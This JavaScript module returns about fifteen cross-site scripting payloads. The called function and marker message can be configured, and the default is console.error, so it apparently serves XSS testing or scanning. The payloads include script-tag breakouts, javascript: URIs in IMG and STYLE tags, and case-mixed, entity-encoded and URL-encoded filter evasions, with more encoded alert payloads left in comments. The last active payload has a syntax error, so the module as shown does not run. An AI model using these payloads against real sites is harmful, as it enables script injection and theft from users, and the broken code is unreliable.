
const entities = require('he');

module.exports = function(options) {
  const {
    fn = 'console.error',
    getPayloadMessage = n => `XSSPayload${n}`
  } = options;

  return [
      '>"><script>' + fn + '("' + getPayloadMessage(1) + '")</script>&',

      '"><STYLE>@import"javascript:' + fn + '(\'' + getPayloadMessage(2) + '\')";</STYLE>',

      ' alert(%26quot;%26%23x20;' + getPayloadMessage(3) + '%26quot;)>',

      '>%22%27><img%20src%3d%22javascript:' + fn + '(%27%20' + getPayloadMessage(4) + '%27)%22>',

      `'%uff1cscript%uff1e'` + fn + `'('` + getPayloadMessage(5) + `')%uff1c/script%uff1e'
      ">
      >" `,

      '\'\';!--"<' + getPayloadMessage(6) + '>=&{()}',

      '<IMG SRC="javascript:' + fn + '(\'' + getPayloadMessage(7) + '\');">',

      '<IMG SRC=javascript:' + fn + '(\'' + getPayloadMessage(8) + '\')>',

      '<IMG SRC=JaVaScRiPt:' + fn + '(\'' + getPayloadMessage(9) + '\')> ',

      '<IMG SRC=JaVaScRiPt:' + fn + '(&quot;' + getPayloadMessage(10) + '<WBR>&quot;)>',

      '<IMG SRC="jav&#x09;ascript:' + fn + '(<WBR>\'' + getPayloadMessage(11) + '\');">',

      '<IMG SRC="jav&#x0A;ascript:' + fn + '(<WBR>\'' + getPayloadMessage(12) + '\');">',

      '<IMG SRC="jav&#x0D;ascript:' + fn + '(<WBR>\'' + getPayloadMessage(13) + '\');">',

      'js4%22,x:' + fn + '%28%22' + getPayloadMessage(14) + '%22%29,y:%22',

      '>"\'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;' +
      encodeURIComponent(entities.encode(fn + "('" + getPayloadMessage(15)  + "')" + , {encodeEverything: true}))


      // TODO: incorporate fn & getPayloadMessage commands into these payloads:
      // `<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
      //  &#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>`,
      //
      // `<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058
      // &<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>`,
      //
      // `<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28
      // &<WBR>#x27&#x58&#x53&#x53&#x27&#x29>`,
  ];
};
